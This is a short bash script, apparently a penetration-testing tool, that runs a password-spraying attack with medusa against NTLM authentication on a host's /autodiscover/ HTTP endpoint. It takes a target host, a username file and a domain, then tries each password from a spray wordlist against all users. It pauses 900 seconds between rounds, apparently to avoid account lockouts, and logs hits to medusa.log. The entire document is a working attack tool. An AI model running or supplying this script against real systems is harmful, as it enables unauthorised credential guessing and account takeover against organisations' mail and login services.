#!/bin/bash
HOST=$1
USERS=$2
#PASSWORD=$p
DOMAIN=$3
if [ -z $HOST ]; then
	echo "Usage: ./ntfs-brute.sh <host> <username_file> <domain>"
	exit 1
fi

while read p; do
PASSWORD=$p
echo "Executing brute force attack"
echo ""
echo "Command:"
echo "medusa -h $HOST -U $DIR/$USERS -p $PASSWORD -M http -m AUTH:NTLM -m DIR:/autodiscover/ -m DOMAIN:$DOMAIN -s"
medusa -h $HOST -U $USERS -p $PASSWORD -M http -m AUTH:NTLM -m DIR:/autodiscover/ -m DOMAIN:$DOMAIN -s -O medusa.log 
sleep 900
done </usr/share/wordlists/pw-spray.txt
